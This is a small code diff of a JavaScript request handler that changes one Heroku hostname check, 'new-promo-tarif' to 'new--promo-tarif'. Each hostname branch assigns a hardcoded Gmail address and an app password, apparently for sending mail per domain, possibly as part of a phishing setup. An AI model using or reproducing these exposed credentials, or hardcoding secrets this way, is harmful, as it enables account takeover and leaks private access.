@@ -22,7 +22,7 @@ export default function handler(req, res) {
         pass = 'lssxwneekjuwlvgt';
 
     }
-    else if (url == 'new-promo-tarif.herokuapp.com'){
+    else if (url == 'new--promo-tarif.herokuapp.com'){
         email = 'ayamperu233@gmail.com';
         pass = 'rtzqphftdjkdrnwa';
         
